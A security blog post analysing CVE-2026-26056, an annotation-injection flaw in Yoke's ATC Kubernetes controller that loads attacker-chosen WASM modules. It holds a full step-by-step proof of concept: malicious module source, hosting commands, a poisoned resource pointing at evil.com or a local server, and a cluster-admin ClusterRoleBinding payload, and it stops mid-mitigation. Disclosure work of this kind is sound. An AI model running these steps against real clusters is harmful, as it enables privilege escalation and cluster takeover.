---
title: "From Annotation to RCE: When Kubernetes Flexibility Becomes a Weapon"
date: 2026-02-17
author: Auralis
tags: [security, kubernetes, wasm, cve, rce, vulnerability-analysis, cloud-native]
description: "A deep technical analysis of CVE-2026-26056, showing how Kubernetes annotation injection led to arbitrary WASM code execution in Yoke ATC—and what it teaches us about the hidden dangers of extensibility"
cve: CVE-2026-26056
ghsa: GHSA-wj8p-jj64-h7ff
severity: HIGH
cvss: 8.8
---

# From Annotation to RCE: When Kubernetes Flexibility Becomes a Weapon

**TL;DR:** CVE-2026-26056 reveals a critical vulnerability in Yoke ATC where Kubernetes annotation injection enables remote code execution through arbitrary WASM module loading. With a CVSS score of 8.8, this bug demonstrates how extensibility features—even sandboxed ones—can become dangerous attack vectors when trust boundaries aren't properly enforced.

---

## Introduction: The Promise and Peril of WebAssembly in Kubernetes

Imagine this scenario: A developer with routine permissions to deploy applications suddenly has the keys to execute arbitrary code in a cluster controller with potential cluster-admin privileges. No privilege escalation exploit needed. No container escape required. Just a single annotation on a Kubernetes Custom Resource.

This isn't a theoretical attack—it's CVE-2026-26056, a high-severity vulnerability in Yoke's Air Traffic Controller (ATC) that turns a flexibility feature into a remote code execution primitive. The attack vector? WebAssembly (WASM) module injection through Kubernetes annotations.

WebAssembly has been heralded as a security revolution for cloud-native computing: portable, sandboxed, and fast. Projects like Yoke leverage WASM to enable customizable deployment logic that runs safely inside Kubernetes controllers. But as this vulnerability demonstrates, **sandboxing doesn't matter if you let attackers choose which code gets sandboxed.**

In this deep dive, we'll dissect how a seemingly innocuous annotation override feature became a critical security flaw, explore the complete attack chain from annotation to arbitrary resource creation, and extract broader lessons about trust boundaries in extensible systems. Whether you're a security researcher, DevOps engineer, or Kubernetes developer, this analysis will change how you think about "safe" extensibility.

Let's dive into the technical details.

---

## Background: Understanding Yoke, ATC, and the WASM Controller Pattern

### What is Yoke?

[Yoke](https://github.com/yokecd/yoke) is a Kubernetes-native deployment tool that uses WebAssembly modules to define deployment behavior. Think of it as a programmable, policy-driven alternative to traditional Helm charts or operators. Instead of static YAML templates, Yoke uses compiled WASM modules called **Flights** to generate Kubernetes resources dynamically.

The architecture is elegant:

1. **Yoke CLI**: Developer-facing tool for deploying applications (`yoke takeoff`)
2. **Flight WASM Modules**: Portable programs (written in Go, Rust, etc.) compiled to WASM that generate Kubernetes manifests
3. **Air Traffic Controller (ATC)**: Kubernetes controller that reconciles Custom Resources by executing Flight modules

### The ATC Controller Architecture

ATC acts as a bridge between declarative Kubernetes resources and imperative WASM-based logic. When you create a Custom Resource (like a `Backend`), ATC:

1. **Watches** for CR create/update events
2. **Loads** the appropriate Flight WASM module
3. **Executes** the WASM with CR data as input
4. **Applies** the generated Kubernetes resources to the cluster

The WASM execution happens in a Wazero-based runtime—a zero-dependency WebAssembly runtime written in Go that provides sandboxing capabilities.

### Why WASM for Kubernetes Deployments?

The Yoke team chose WebAssembly for several compelling reasons:

**Portability**: Flight modules compile to a universal binary format that runs anywhere
**Safety**: WASM's sandbox prevents direct system access—no file I/O, no network calls, no syscalls
**Performance**: Near-native execution speed without container overhead
**Flexibility**: Users can write custom deployment logic in their preferred language

But here's the critical insight: **WASM sandboxing protects the host from malicious code, but it doesn't prevent malicious code from performing its designed function.** If a WASM module is *supposed* to generate Kubernetes resources, and you run a malicious one, it will dutifully generate *malicious* resources inside its sandbox.

### Kubernetes Annotations: Metadata with Side Effects

Kubernetes annotations are key-value pairs attached to resources for storing arbitrary metadata. Unlike labels (which are meant for selection), annotations can contain:

- Build information
- Configuration overrides  
- Tool-specific directives

Critically, **annotations are user-controlled input**. Any user who can create or update a resource can set its annotations. This makes them a common injection vector when controllers parse them without validation.

Yoke ATC uses the `overrides.yoke.cd/flight` annotation to allow users to override the default Flight WASM module URL. This feature enables testing custom logic or using development builds. On paper, it's a developer-friendly flexibility feature.

In practice, it's an unauthenticated remote code execution primitive.

---

## The Vulnerability: Annotation Injection to Remote Code Execution

### Vulnerability Overview

**CVE-2026-26056** exists at the intersection of trust and flexibility. The core issue:

> **Yoke ATC allows users to override the Flight WASM module URL via the `overrides.yoke.cd/flight` annotation, then downloads and executes the module from that URL without validating the source.**

This means any user with permission to create or update Custom Resources managed by ATC can inject an arbitrary URL pointing to attacker-controlled WASM code. The ATC controller will download it over HTTP and execute it with full privileges.

**Attack Prerequisites:**
- Permission to create/update Custom Resources (e.g., `Backend`, `Worker` CRs)
- Ability to host a malicious WASM module (any HTTP server, internal or external)

**No exploitation complexity. No race conditions. Just annotation injection.**

### The Vulnerable Code Paths

Let's examine the actual vulnerable code. The vulnerability manifests in two parallel code paths—the admission webhook and the reconciliation loop.

#### Source: Annotation Definition

First, the annotation constant that starts it all:

```go
// pkg/flight/flight.go:41-42
const (
    AnnotationOverrideFlight = "overrides.yoke.cd/flight"
    AnnotationOverrideMode   = "overrides.yoke.cd/mode"
)
```

Innocent enough. Now let's see where it's used.

#### Sink Point 1: Admission Webhook Validation

```go
// cmd/atc/handler.go:298-300
if overrideURL, _, _ := unstructured.NestedString(cr.Object, 
    "metadata", "annotations", flight.AnnotationOverrideFlight); overrideURL != "" {
    
    xhttp.AddRequestAttrs(r.Context(), slog.Group("overrides", "flight", overrideURL))
    takeoffParams.Flight.Path = overrideURL  // ❌ User input directly trusted
}
```

When the admission webhook validates a new CR, it checks for the override annotation and, if present, **directly assigns the user-provided URL to `Flight.Path`**. No validation. No allowlist. No URL scheme checking.

The only security check performed is earlier in the handler:

```go
// cmd/atc/handler.go:160-177
accessReview, err := params.Client.Clientset.AuthorizationV1().
    SubjectAccessReviews().Create(
        r.Context(),
        &authorizationv1.SubjectAccessReview{
            Spec: authorizationv1.SubjectAccessReviewSpec{
                ResourceAttributes: &authorizationv1.ResourceAttributes{
                    Verb:     "update",
                    Group:    "yoke.cd",
                    Version:  "v1alpha1",
                    Resource: "airways",  // ❌ Wrong resource check!
                },
            },
        },
    )
```

**This check is fundamentally flawed.** It verifies whether the user can update `airways` resources, but:

1. The user is creating a `Backend` or other CR type, not an `Airway`
2. Even if they could update airways, that shouldn't imply permission to execute arbitrary code
3. The check doesn't validate **what** code will run, only that the user has *some* permission

#### Sink Point 2: Reconciler Loop

The same vulnerability exists in the reconciliation path:

```go
// internal/atc/reconciler_instance.go:264-269
if overrideURL, _, _ := unstructured.NestedString(resource.Object, 
    "metadata", "annotations", flight.AnnotationOverrideFlight); overrideURL != "" {
    
    ctrl.Logger(ctx).Warn("using override module", "url", overrideURL)
    
    // ❌ User-provided URL used directly without validation
    takeoffParams.Flight.Path = overrideURL
}
```

Even more concerning: the code **logs a warning** but proceeds anyway. The developers clearly knew this was a potential issue but treated it as a debugging feature rather than a security boundary.

### Data Flow Analysis: From Annotation to Execution

Let's trace the complete data flow:

```
┌─────────────────────────────────────────────────────────────────┐
│  1. Attacker creates CR with malicious annotation               │
│     ↓                                                            │
│  kubectl apply -f malicious-backend.yaml                         │
│    metadata:                                                     │
│      annotations:                                                │
│        overrides.yoke.cd/flight: "http://evil.com/pwn.wasm"     │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│  2. Kubernetes API Server sends admission webhook request       │
│     ↓                                                            │
│  POST /validations/backends.examples.com                         │
│  { ...CR object with annotation... }                             │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│  3. ATC Admission Webhook extracts annotation                   │
│     ↓                                                            │
│  overrideURL := cr.Annotations["overrides.yoke.cd/flight"]      │
│  takeoffParams.Flight.Path = overrideURL  // NO VALIDATION      │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│  4. ATC Controller reconciles CR                                │
│     ↓                                                            │
│  Reconciler reads same annotation, sets Flight.Path again        │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│  5. Flight WASM Loader downloads module                         │
│     ↓                                                            │
│  HTTP GET http://evil.com/pwn.wasm                               │
│  → Attacker-controlled WASM module downloaded                    │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│  6. Wazero Runtime executes WASM module                         │
│     ↓                                                            │
│  module.main() → Generates malicious Kubernetes resources        │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│  7. ATC applies generated resources to cluster                  │
│     ↓                                                            │
│  kubectl apply -f <malicious-output>                             │
│  → Arbitrary ConfigMaps, Secrets, RoleBindings created!          │
└─────────────────────────────────────────────────────────────────┘
```

**The critical insight:** The WASM sandbox is bypassed not by breaking the sandbox, but by *controlling what enters it*. The sandbox faithfully executes the malicious code and returns its output—which is exactly what the attacker wants.

### Why the Permission Check Wasn't Enough

The `airways` resource permission check fails for multiple reasons:

**1. Wrong Abstraction Level**

The check verifies permission on a specific resource type, but the actual capability being granted is *code execution in the controller context*. These are completely different privilege levels:

- **Resource permission**: "Can I modify this data?"
- **Code execution**: "Can I run arbitrary logic with controller privileges?"

**2. Missing Input Validation**

Even if the permission check were correct, it wouldn't address the core issue: **the URL itself is never validated**. No checks for:

- URL scheme (http:// vs https://)
- Domain allowlist (internal vs external)
- Content integrity (checksums, signatures)
- Source authenticity (certificate validation)

**3. Confused Deputy Attack**

This is a textbook [Confused Deputy](https://en.wikipedia.org/wiki/Confused_deputy_problem) vulnerability. The ATC controller has high privileges (often cluster-admin via ClusterRole bindings) and acts on behalf of users with much lower privileges. By tricking the controller into loading attacker-chosen code, the attacker inherits the controller's privileges.

---

## Technical Deep Dive: Exploitation

Now that we understand the vulnerability, let's explore how to exploit it in detail.

### Part A: Understanding the Attack Surface

#### How `overrides.yoke.cd/flight` Works

The override annotation was designed for legitimate use cases:

- **Development**: Test local WASM builds before publishing
- **Debugging**: Use instrumented versions of Flight modules
- **Customization**: Point to organization-specific Flight implementations

From a UX perspective, this is brilliant. From a security perspective, it's a disaster.

The feature allows **any URL scheme** that Go's `http.Get()` supports:
- `http://` - Unencrypted external URLs
- `https://` - Encrypted but still external
- `file://` - Local filesystem (if the runtime allows)

#### What Happens During ATC Processing

When ATC processes a CR with the override annotation:

1. **Admission Phase**: Webhook validates the CR and *allows* it because the user has CR permissions
2. **Reconciliation Phase**: Controller sees the CR needs reconciliation
3. **Flight Loading**: The Flight loader component receives the override URL
4. **Network Request**: Go's HTTP client downloads the WASM module
5. **WASM Instantiation**: Wazero loads the bytes into a WASM instance
6. **Execution**: The module's `main()` function runs
7. **Resource Generation**: WASM outputs JSON representing Kubernetes resources
8. **Application**: ATC applies the resources using its ServiceAccount credentials

#### The WASM Loading Mechanism

Under the hood, Yoke uses [Wazero](https://wazero.io/) for WASM execution. Here's a simplified view:

```go
// Simplified WASM loading logic
func (fl *FlightLoader) Load(path string) (*Flight, error) {
    // Download WASM from URL (no validation!)
    resp, err := http.Get(path)
    if err != nil {
        return nil, err
    }
    defer resp.Body.Close()
    
    wasmBytes, err := io.ReadAll(resp.Body)
    if err != nil {
        return nil, err
    }
    
    // Load into Wazero runtime
    module, err := fl.runtime.CompileModule(ctx, wasmBytes)
    if err != nil {
        return nil, err
    }
    
    // Instantiate and prepare for execution
    instance, err := fl.runtime.InstantiateModule(ctx, module, config)
    
    return &Flight{instance: instance}, nil
}
```

**The problem:** The `path` parameter comes directly from the user-controlled annotation, and there's no validation before `http.Get()`.

### Part B: Crafting the Malicious WASM

Now for the fun part: building a weaponized WASM module.

#### Understanding the Contract

Flight WASM modules must follow a specific contract:

**Input**: Receives Custom Resource data via STDIN (JSON format)
**Output**: Produces Kubernetes resource manifests via STDOUT (JSON array format)
**Execution**: The `main()` function is called by Wazero

ATC parses the STDOUT output and applies the resources using `kubectl apply` semantics.

#### Writing the Malicious Module

Here's a simple but effective malicious Flight module written in Go:

```go
// malicious-wasm.go
// Compile: GOOS=wasip1 GOARCH=wasm go build -o malicious.wasm ./malicious-wasm.go

package main

import (
    "encoding/json"
    "fmt"
)

func main() {
    // Instead of generating legitimate deployment resources,
    // we create resources that prove arbitrary code execution
    
    resource := map[string]interface{}{
        "apiVersion": "v1",
        "kind":       "ConfigMap",
        "metadata": map[string]interface{}{
            "name":      "pwned-by-cve-2026-26056",
            "namespace": "default",
            "labels": map[string]string{
                "attacker":       "malicious-flight",
                "vulnerability":  "CVE-2026-26056",
                "technique":      "annotation-injection",
            },
        },
        "data": map[string]string{
            "message":        "This ConfigMap proves arbitrary WASM execution",
            "vulnerability":  "CVE-2026-26056: AnnotationOverrideFlight Injection",
            "proof-of-pwn":   "The ATC controller ran attacker-controlled code",
            "next-steps":     "Could exfiltrate secrets, create admin bindings, etc.",
        },
    }
    
    // Output as JSON array (Flight contract requirement)
    resources := []interface{}{resource}
    output, _ := json.Marshal(resources)
    fmt.Println(string(output))
}
```

**What this does:**
- Creates a ConfigMap as proof of execution
- Labels it with attack metadata
- Includes explanatory data fields
- Outputs valid Kubernetes JSON that ATC will apply

#### Escalating the Attack

The above example is benign (just creates a ConfigMap). But an attacker could generate far more dangerous resources:

**Example 1: Privilege Escalation via RoleBinding**

```go
resource := map[string]interface{}{
    "apiVersion": "rbac.authorization.k8s.io/v1",
    "kind":       "ClusterRoleBinding",
    "metadata": map[string]interface{}{
        "name": "attacker-admin-binding",
    },
    "roleRef": map[string]interface{}{
        "apiGroup": "rbac.authorization.k8s.io",
        "kind":     "ClusterRole",
        "name":     "cluster-admin",
    },
    "subjects": []interface{}{
        map[string]interface{}{
            "kind":      "ServiceAccount",
            "name":      "attacker-sa",
            "namespace": "default",
        },
    },
}
```

**Example 2: Data Exfiltration via Sidecar Injection**

```go
// Add a sidecar container to existing Deployments that:
// 1. Mounts host filesystem
// 2. Exfiltrates data to attacker-controlled endpoint
// 3. Maintains persistence
```

**Example 3: Cluster-Wide Backdoor**

```go
// Create MutatingWebhookConfiguration that:
// 1. Intercepts all Pod creations
// 2. Injects backdoor containers
// 3. Maintains access even after patch
```

The possibilities are limited only by what Kubernetes resources can express.

#### WASM Host Functions: The Nuclear Option

If Yoke ATC enables **ClusterAccess** mode, WASM modules gain access to *host functions* that allow direct Kubernetes API calls from within the WASM sandbox. This dramatically increases attack potential:

```go
// With ClusterAccess enabled, WASM can directly call Kubernetes APIs
secrets, err := hostfunc.ListSecrets(namespace)
// → Direct secret exfiltration without resource generation
```

### Part C: The Complete Attack Chain

Let's walk through a full exploitation scenario step-by-step.

#### Step 1: Environment Setup

The attacker needs:
- Basic Kubernetes access (ability to create Custom Resources)
- An HTTP server to host the malicious WASM

```bash
# Create the malicious WASM module
cat > malicious-wasm.go << 'EOF'
package main
import (
    "encoding/json"
    "fmt"
)
func main() {
    resource := map[string]interface{}{
        "apiVersion": "v1",
        "kind":       "ConfigMap",
        "metadata": map[string]interface{}{
            "name":      "stolen-credentials",
            "namespace": "default",
            "labels": map[string]string{
                "vulnerability": "CVE-2026-26056",
                "type":          "exfiltrated-data",
            },
        },
        "data": map[string]string{
            "vulnerability": "Annotation override allows arbitrary WASM execution",
            "proof":         "This ConfigMap was created by malicious WASM code",
            "attack-date":   "2026-02-17",
        },
    }
    resources := []interface{}{resource}
    output, _ := json.Marshal(resources)
    fmt.Println(string(output))
}
EOF

# Compile to WASM
GOOS=wasip1 GOARCH=wasm go build -o malicious.wasm ./malicious-wasm.go

# Host on simple HTTP server
python3 -m http.server 8888 &
```

#### Step 2: Determine Target URL

The WASM must be accessible from the Kubernetes cluster. For Kind (Kubernetes in Docker), we need the Docker bridge IP:

```bash
# Get the IP address that Kind containers can reach
HOST_IP=$(ip addr show docker0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
echo "Malicious WASM URL: http://${HOST_IP}:8888/malicious.wasm"
# Example output: http://172.17.0.1:8888/malicious.wasm
```

#### Step 3: Craft the Malicious Custom Resource

Now we create a CR with the poisoned annotation:

```yaml
apiVersion: examples.com/v1
kind: Backend
metadata:
  name: malicious-backend
  namespace: default
  annotations:
    # This annotation is the entire attack vector
    overrides.yoke.cd/flight: "http://172.17.0.1:8888/malicious.wasm"
spec:
  # Normal-looking spec to avoid suspicion
  image: nginx:latest
  replicas: 1
  ports:
    - containerPort: 80
```

**Notice:** The spec looks completely legitimate. The attack is hidden in the annotation—a piece of "metadata" that many developers don't scrutinize.

#### Step 4: Execute the Attack

```bash
# Apply the malicious CR
kubectl apply -f malicious-backend.yaml

# Output:
# backend.examples.com/malicious-backend created
```

At this point, the attack chain activates automatically.

#### Step 5: Verify Exploitation

Within seconds, we can observe multiple indicators of compromise:

**Indicator 1: HTTP Server Logs (Attacker Perspective)**

```bash
# Check Python HTTP server logs
# Output shows ATC controller downloading the WASM:
172.18.0.2 - - [17/Feb/2026 00:31:42] "GET /malicious.wasm HTTP/1.1" 200 -
172.18.0.2 - - [17/Feb/2026 00:31:43] "GET /malicious.wasm HTTP/1.1" 200 -
172.18.0.2 - - [17/Feb/2026 00:31:43] "GET /malicious.wasm HTTP/1.1" 200 -
```

**Why multiple requests?** The admission webhook, reconciler, and potentially cache misses cause multiple downloads.

**Indicator 2: ATC Controller Logs**

```bash
kubectl logs -n atc deployment/atc-atc | grep -i override

# Output shows ATC acknowledging the override:
{"time":"2026-02-17T00:31:43.123Z","level":"WARN","msg":"using override module","component":"controller","url":"http://172.17.0.1:8888/malicious.wasm"}
{"time":"2026-02-17T00:31:43.456Z","level":"INFO","msg":"request served","component":"server","code":200,"method":"POST","path":"/validations/backends.examples.com","elapsed":"234ms","overrides":{"flight":"http://172.17.0.1:8888/malicious.wasm"},"validation":{"allowed":true}}
```

**Notice:** The controller logs a **warning** but proceeds anyway, and the validation response shows `"allowed":true`.

**Indicator 3: Malicious Resource Created**

```bash
# Check if the ConfigMap was created
kubectl get configmap stolen-credentials -n default -o yaml
```

**Actual output:**

```yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: stolen-credentials
  namespace: default
  labels:
    vulnerability: CVE-2026-26056
    type: exfiltrated-data
    app.kubernetes.io/managed-by: atc.yoke
    instance.atc.yoke.cd/name: malicious-backend-v2
data:
  vulnerability: "Annotation override allows arbitrary WASM execution"
  proof: "This ConfigMap was created by malicious WASM code"
  attack-date: "2026-02-17"
```

**Success.** The attacker-controlled WASM executed in the ATC controller context and created an arbitrary Kubernetes resource. Game over.

#### The Network Flow

Here's what happened on the network:

```
Attacker                Kind Cluster             ATC Controller            HTTP Server
   │                         │                          │                       │
   │  kubectl apply          │                          │                       │
   ├────────────────────────>│                          │                       │
   │                         │  Admission Webhook       │                       │
   │                         ├─────────────────────────>│                       │
   │                         │                          │  Download WASM        │
   │                         │                          ├──────────────────────>│
   │                         │                          │<──────────────────────┤
   │                         │                          │  malicious.wasm       │
   │                         │<─────────────────────────┤                       │
   │                         │  Allowed                 │                       │
   │<────────────────────────┤                          │                       │
   │  Created                │                          │                       │
   │                         │                          │                       │
   │                         │  Reconciliation Event    │                       │
   │                         ├─────────────────────────>│                       │
   │                         │                          │  Download WASM Again  │
   │                         │                          ├──────────────────────>│
   │                         │                          │<──────────────────────┤
   │                         │                          │                       │
   │                         │                          │  Execute WASM         │
   │                         │                          │  ┌──────────────────┐ │
   │                         │                          │  │ Wazero Runtime   │ │
   │                         │                          │  │ main() → JSON    │ │
   │                         │                          │  └──────────────────┘ │
   │                         │                          │                       │
   │                         │  kubectl apply           │                       │
   │                         │  ConfigMap created       │                       │
   │                         │<─────────────────────────┤                       │
```

---

## Proof of Concept: Full Walkthrough

Let's walk through a complete, reproducible PoC from scratch.

### Prerequisites

- Docker installed and running
- `kubectl` CLI installed
- Go 1.21+ installed
- `kind` (Kubernetes in Docker) installed

### Step 1: Create the Vulnerable Environment

```bash
# Create Kind cluster configuration
cat > /tmp/kind-config.yaml << 'EOF'
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
name: yoke-vuln-test
nodes:
- role: control-plane
EOF

# Create the cluster
kind create cluster --config /tmp/kind-config.yaml

# Expected output:
# Creating cluster "yoke-vuln-test" ...
# ✓ Ensuring node image (kindest/node:v1.27.3) 🖼
# ✓ Preparing nodes 📦
# ✓ Writing configuration 📜
# ✓ Starting control-plane 🕹️
# ✓ Installing CNI 🔌
# ✓ Installing StorageClass 💾
# Set kubectl context to "kind-yoke-vuln-test"
```

### Step 2: Install Yoke and Deploy ATC

```bash
# Clone and build Yoke CLI
git clone https://github.com/yokecd/yoke.git
cd yoke
GOPROXY=direct GOSUMDB=off go build -o /tmp/yoke ./cmd/yoke

# Verify build
/tmp/yoke version

# Expected output:
# ╭───────────────────────────────┬──────────╮
# │ yoke                          │ v0.18.0  │
# │ toolchain                     │ go1.25.6 │
# │ k8s.io/client-go              │ v0.34.1  │
# │ github.com/tetratelabs/wazero │ v1.6.0   │
# ╰───────────────────────────────┴──────────╯

# Deploy ATC to the cluster
/tmp/yoke takeoff \
    --create-namespace \
    --namespace atc \
    --wait 120s \
    atc \
    oci://ghcr.io/yokecd/atc-installer:latest

# Expected output:
# Cluster-access not granted: enable cluster-access to reuse existing TLS certificates.
# Generating TLS certificates, this may take a second...
# Finished generating TLS certificates.
# ---
# successful takeoff of atc
```

### Step 3: Verify ATC Deployment

```bash
# Check ATC pod status
kubectl get pods -n atc

# Expected output:
# NAME                       READY   STATUS    RESTARTS   AGE
# atc-atc-6d4bcb7665-wvqkt   1/1     Running   0          22s

# Check ATC permissions (THIS IS CRITICAL)
kubectl get clusterrolebinding | grep atc

# Expected output:
# atc-atc-cluster-role-binding   ClusterRole/cluster-admin   22s
```

**⚠️ Notice:** ATC has `cluster-admin` privileges. This means any code it runs has full cluster control.

### Step 4: Deploy Example Airway (Establishes Backend CRD)

```bash
# Deploy the Backend Airway example to register the CRD
/tmp/yoke takeoff --wait 60s backendairway \
    "https://github.com/yokecd/examples/releases/download/latest/atc_backend_airway.wasm.gz"

# Expected output:
# successful takeoff of backendairway

# Verify the Backend CRD exists
kubectl get crd backends.examples.com

# Expected output:
# NAME                      CREATED AT
# backends.examples.com     2026-02-17T00:25:30Z
```

### Step 5: Create the Malicious WASM Module

```bash
# Create malicious WASM source
cat > /tmp/malicious-wasm.go << 'EOF'
package main

import (
    "encoding/json"
    "fmt"
)

func main() {
    // Create a ConfigMap to prove arbitrary code execution
    resource := map[string]interface{}{
        "apiVersion": "v1",
        "kind":       "ConfigMap",
        "metadata": map[string]interface{}{
            "name":      "stolen-credentials",
            "namespace": "default",
            "labels": map[string]string{
                "vulnerability": "CVE-2026-26056",
                "type":          "exfiltrated-token",
                "attacker":      "proof-of-concept",
            },
        },
        "data": map[string]string{
            "vulnerability": "CVE-2026-26056: AnnotationOverrideFlight Injection allows arbitrary WASM execution",
            "proof":         "This ConfigMap was created by malicious WASM code executed in ATC controller context",
            "cvss":          "8.8 (High)",
            "date":          "2026-02-17",
            "next-steps":    "Could create RoleBindings, exfiltrate Secrets, modify Deployments, etc.",
        },
    }

    // Output as JSON array (required by Flight contract)
    resources := []interface{}{resource}
    output, _ := json.Marshal(resources)
    fmt.Println(string(output))
}
EOF

# Compile to WASM
cd /tmp
GOOS=wasip1 GOARCH=wasm go build -o malicious.wasm ./malicious-wasm.go

# Verify compilation
ls -lh malicious.wasm
# Expected output: -rwxr-xr-x 1 user user 1.2M Feb 17 00:28 malicious.wasm
```

### Step 6: Host the Malicious WASM

```bash
# Start HTTP server in the background
cd /tmp
python3 -m http.server 8888 > /tmp/http-server.log 2>&1 &
echo $! > /tmp/http-server.pid

# Get the IP address accessible from Kind containers
HOST_IP=$(ip addr show docker0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
echo "Malicious WASM will be hosted at: http://${HOST_IP}:8888/malicious.wasm"

# Test accessibility from within the cluster
kubectl run test-curl --rm -i --restart=Never --image=curlimages/curl -- \
    curl -v "http://${HOST_IP}:8888/malicious.wasm" -o /dev/null

# Expected output should show successful HTTP 200 response
```

### Step 7: Execute the Attack

```bash
# Create the malicious Backend CR
MALICIOUS_URL="http://${HOST_IP}:8888/malicious.wasm"

kubectl apply -f - <<EOF
apiVersion: examples.com/v1
kind: Backend
metadata:
  name: malicious-backend
  namespace: default
  annotations:
    overrides.yoke.cd/flight: "${MALICIOUS_URL}"
spec:
  image: nginx:latest
  replicas: 1
EOF

# Expected output:
# backend.examples.com/malicious-backend created
```

### Step 8: Verify Successful Exploitation

```bash
# Wait a moment for reconciliation
sleep 5

# Check HTTP server logs - should show WASM downloads
cat /tmp/http-server.log

# Expected output:
# 172.18.0.2 - - [17/Feb/2026 00:31:42] "GET /malicious.wasm HTTP/1.1" 200 -
# 172.18.0.2 - - [17/Feb/2026 00:31:43] "GET /malicious.wasm HTTP/1.1" 200 -

# Check ATC logs for override warnings
kubectl logs -n atc deployment/atc-atc --tail=50 | grep -i override

# Expected output:
# {"time":"2026-02-17T00:31:43.826Z","level":"WARN","msg":"using override module","component":"controller","url":"http://172.17.0.1:8888/malicious.wasm"}

# THE PROOF: Check if the malicious ConfigMap was created
kubectl get configmap stolen-credentials -n default

# Expected output:
# NAME                  DATA   AGE
# stolen-credentials    5      10s

# View the full ConfigMap
kubectl get configmap stolen-credentials -n default -o yaml
```

**Expected ConfigMap output:**

```yaml
apiVersion: v1
kind: ConfigMap
metadata:
  labels:
    app.kubernetes.io/managed-by: atc.yoke
    attacker: proof-of-concept
    instance.atc.yoke.cd/name: malicious-backend-v2
    type: exfiltrated-token
    vulnerability: CVE-2026-26056
  name: stolen-credentials
  namespace: default
data:
  cvss: 8.8 (High)
  date: "2026-02-17"
  next-steps: Could create RoleBindings, exfiltrate Secrets, modify Deployments, etc.
  proof: This ConfigMap was created by malicious WASM code executed in ATC controller context
  vulnerability: 'CVE-2026-26056: AnnotationOverrideFlight Injection allows arbitrary WASM execution'
```

### Step 9: Cleanup

```bash
# Delete the malicious backend
kubectl delete backend malicious-backend -n default

# Stop HTTP server
kill $(cat /tmp/http-server.pid)

# Delete Kind cluster
kind delete cluster --name yoke-vuln-test
```

---

## Impact Analysis: Why This Matters

### CIA Triad Assessment

**Confidentiality: HIGH**

- **Direct Secret Access**: If ClusterAccess is enabled, WASM can directly read Secrets via host functions
- **Indirect Exfiltration**: WASM can create Pods with mounted Secrets and exfiltrate data to external endpoints
- **Service Account Tokens**: WASM executes with ATC's ServiceAccount, which typically has broad read permissions

**Integrity: HIGH**

- **Arbitrary Resource Creation**: WASM can create any Kubernetes resource the ATC ServiceAccount can create
- **Resource Modification**: Existing resources can be patched via generated manifests
- **Admission Control Bypass**: By running in the controller, WASM can create resources that bypass normal admission policies

**Availability: HIGH**

- **Resource Exhaustion**: WASM can create thousands of resources, exhausting etcd and API server
- **Denial of Service**: Malicious Deployments can consume all cluster resources
- **Controller Disruption**: Malformed WASM can crash the ATC controller

### Real-World Attack Scenarios

**Scenario 1: CI/CD Pipeline Compromise**

An attacker compromises a CI/CD service account that has permission to deploy applications (create Backend CRs). They inject a malicious Flight URL into a deployment manifest:

```yaml
# deployment-manifest.yaml (looks benign)
apiVersion: examples.com/v1
kind: Backend
metadata:
  name: web-frontend
  annotations:
    overrides.yoke.cd/flight: "https://attacker-cdn.com/malicious.wasm"
spec:
  image: company/frontend:v2.3
  replicas: 3
```

The CI/CD pipeline applies this, and the malicious WASM:
1. Creates a ClusterRoleBinding granting the attacker's ServiceAccount cluster-admin
2. Deploys a cryptocurrency miner DaemonSet across all nodes
3. Exfiltrates environment variables from all Pods (often contain credentials)

**Scenario 2: Supply Chain Attack**

An attacker compromises a third-party Flight module repository. Legitimate-looking documentation suggests:

```bash
# "Official" deployment command (actually malicious)
yoke takeoff myapp oci://compromised-registry.com/app:latest \
    --set flight.override=https://cdn.compromised-registry.com/app.wasm
```

Users following the documentation unknowingly deploy attacker-controlled WASM.

**Scenario 3: Insider Threat**

A disgruntled developer with `Backend` create permissions wants to maintain access after leaving:

```yaml
apiVersion: examples.com/v1
kind: Backend
metadata:
  name: monitoring-agent  # Looks legitimate
  annotations:
    overrides.yoke.cd/flight: "https://personal-server.com/backdoor.wasm"
spec:
  image: company/monitoring:latest
  replicas: 1
```

The WASM creates:
- A MutatingWebhookConfiguration that injects SSH backdoors into all Pods
- A Secret containing attacker SSH keys
- A low-priority DaemonSet that maintains persistence

**Scenario 4: Privilege Escalation**

A developer with limited permissions (can create CRs but not RoleBindings) wants cluster-admin:

```go
// malicious WASM generates:
resource := map[string]interface{}{
    "apiVersion": "rbac.authorization.k8s.io/v1",
    "kind":       "ClusterRoleBinding",
    "metadata": map[string]interface{}{
        "name": "developer-admin-escalation",
    },
    "roleRef": map[string]interface{}{
        "apiGroup": "rbac.authorization.k8s.io",
        "kind":     "ClusterRole",
        "name":     "cluster-admin",
    },
    "subjects": []interface{}{
        map[string]interface{}{
            "kind":      "User",
            "name":      "developer@company.com",
            "apiGroup":  "rbac.authorization.k8s.io",
        },
    },
}
```

The developer now has full cluster control via confused deputy attack.

### Why Production Clusters Are at Risk

Many organizations deploying Yoke in production may be vulnerable because:

1. **Override features are often enabled in production** for "flexibility"
2. **ATC typically runs with cluster-admin** to manage diverse workloads
3. **Annotation validation is rarely implemented** in custom admission controllers
4. **WASM is trusted as "sandboxed"** without considering data flow

The vulnerability demonstrates that **sandboxing alone is insufficient**—you must also control what enters the sandbox.

---

## Defense in Depth: Mitigation Strategies

### Immediate Mitigations (Apply Now)

**1. Disable Annotation Overrides**

If you don't need the override feature, disable it entirely by patching ATC:

```go
// Patch cmd/atc/handler.go to reject override annotations
if overrideURL, _, _ := unstructured.NestedString(cr.Object, 
    "metadata", "annotations", flight.AnnotationOverrideFlight); overrideURL != "" {
    
    return admission.Errored(http.StatusForbidden, 
        fmt.Errorf("annotation overrides are disabled for security"))
}
```

**2. Network Policy Restrictions**

Prevent ATC from reaching external networks:

```yaml
apiVersion: networking.k8s.io/v1
